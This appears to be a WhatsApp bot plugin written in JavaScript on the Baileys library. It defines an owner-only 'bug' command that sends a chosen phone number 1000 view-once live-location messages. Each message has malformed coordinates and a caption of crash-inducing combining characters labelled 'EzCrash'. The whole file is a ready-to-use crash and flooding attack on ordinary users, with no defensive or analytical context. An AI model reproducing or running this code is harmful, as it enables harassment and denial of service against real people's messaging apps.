const { generateWAMessageFromContent, proto } = global.baileys;

exports.run = {
usage: ['buglokasi', 'bug', 'buglocal'], 
use: 'text',
category: 'bug',
async: async (m, { func, mecha, froms }) => {
if (!froms) return m.reply('Invalid number.')
for (let i = 0; i < 1000; i++) {
var msg = generateWAMessageFromContent(froms, proto.Message.fromObject({
viewOnceMessage: {
message: {
"liveLocationMessage": {
"degreesLatitude": "p",
"degreesLongitude": "p",
"caption": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
"sequenceNumber": "0",
"jpegThumbnail": ""
}
}
}
}), { userJid: froms, quoted: m })
await mecha.relayMessage(froms, msg.message, {
messageId: msg.key.id
})
await func.delay(100)
}
return m.reply(`Successfully send bug to @${froms.split('@')[0]}`)
},
owner: true
}